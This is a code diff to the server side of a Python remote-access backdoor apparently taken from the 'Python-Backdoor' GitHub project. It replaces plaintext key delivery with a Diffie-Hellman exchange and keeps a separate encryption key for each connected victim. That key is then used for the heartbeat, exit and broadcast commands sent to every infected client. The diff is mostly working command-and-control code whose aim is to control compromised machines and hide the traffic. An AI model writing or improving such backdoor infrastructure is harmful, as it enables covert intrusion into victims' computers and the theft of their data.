@@ -5,7 +5,6 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-import base64
 import logging
 import socket
 import sys
@@ -13,7 +12,7 @@ import time
 from threading import Thread
 
 from src.encrypted_socket import EncryptedSocket
-from src.encryption import Encryption
+from src.diffie_hellman import DiffieHellman
 from src import helper, errors
 from src.definitions.commands import *
 
@@ -28,9 +27,6 @@ class Server:
         self.port = port
         self.connections = []
         self.addresses = []
-
-        self.encryption = Encryption()
-        self.fernet = self.encryption.fernet
 
         self.listener = socket.socket()
 
@@ -61,20 +57,34 @@ class Server:
                     _socket, address = self.listener.accept()
                     _socket.setblocking(True)
 
-                    es = EncryptedSocket(_socket, self.fernet)
+                    dh = DiffieHellman()
 
-                    # first command is always the unencrypted key (as b64)
-                    # not the best solution, but sending it raw without wrapped JSON will remove emphasis
-                    es.send(base64.b64encode(self.encryption.key), False)
-                    self.logger.debug(f"send key: {self.encryption.key}")
+                    # send the public key first
+                    _socket.send(str(dh.pub_key).encode())
+
+                    self.logger.debug(f"send pub key: {dh.pub_key}")
+
+                    pub_key = int(_socket.recv(1024).decode())
+
+                    self.logger.debug(f"recv pub key: {pub_key}")
+
+                    dh.set_shared_key(pub_key)
+
+                    es = EncryptedSocket(_socket, dh.key)
+
+                    es.send_json(CLIENT_INFO)
 
                     while True:
-                        # wait for handshake
+                        # wait for info
                         response = es.recv_json()
-                        if response["key"] == CLIENT_HANDSHAKE:
+
+                        if response["key"] == SUCCESS:
                             break
 
-                    address = {**{"ip": address[0], "port": address[1]}, **response["value"], **{"connected": True}}
+                    address = {**{"ip": address[0], "port": address[1]}, **response["value"], **{"connected": True},
+                               **{"cbc_key": dh.key}}
+
+                    del dh
 
                     if es.socket in self.connections:
                         self.addresses[self.connections.index(es.socket)]["connected"] = True
@@ -94,8 +104,9 @@ class Server:
 
     def close_clients(self):
         if len(self.connections) > 0:
-            for _, _socket in enumerate(self.active_connections()):
-                es = EncryptedSocket(_socket, self.fernet)
+            for _socket in self.active_connections():
+                key = self.addresses[self.connections.index(_socket)]["cbc_key"]
+                es = EncryptedSocket(_socket, key)
 
                 try:
                     es.send_json(CLIENT_EXIT)
@@ -137,7 +148,8 @@ class Server:
         for _, _socket in enumerate(self.active_connections()):
             close_conn = False
 
-            es = EncryptedSocket(_socket, self.fernet)
+            k = self.addresses[self.connections.index(_socket)]["cbc_key"]
+            es = EncryptedSocket(_socket, k)
 
             try:
                 es.send_json(CLIENT_HEARTBEAT)
@@ -202,13 +214,13 @@ class Server:
         except Exception:
             raise errors.ServerSocket.InvalidIndex(f"No active connection found with index {connection_id}")
 
-        return EncryptedSocket(_socket, self.fernet)
+        return EncryptedSocket(_socket, self.addresses[connection_id - 1]["cbc_key"])
 
     def send_all_connections(self, key, value, recv=False, recvall=False):
         if self.num_active_connections() > 0:
             for i, _socket in enumerate(self.active_connections()):
 
-                es = EncryptedSocket(_socket, self.fernet)
+                es = EncryptedSocket(_socket, self.addresses[i]["cbc_key"])
 
                 try:
                     es.send_json(key, value)
@@ -218,13 +230,16 @@ class Server:
                 output = ""
 
                 if recvall:
-                    buffer = es.recv_json()["value"]["buffer"]
+                    data = es.recv_json()
+
+                    buffer = data["value"]["buffer"]
+
                     output = es.recvall(buffer).decode()
                 elif recv:
                     output = es.recv_json()["value"]
 
                 if output:
-                    _info = self.addresses[self.connections.index(es.socket)]
+                    _info = self.addresses[i]
                     print(f"Response from connection {str(i+1)} at {_info['ip']}:{_info['port']} \n{output}")
         else:
             self.logger.warning("No active connections")
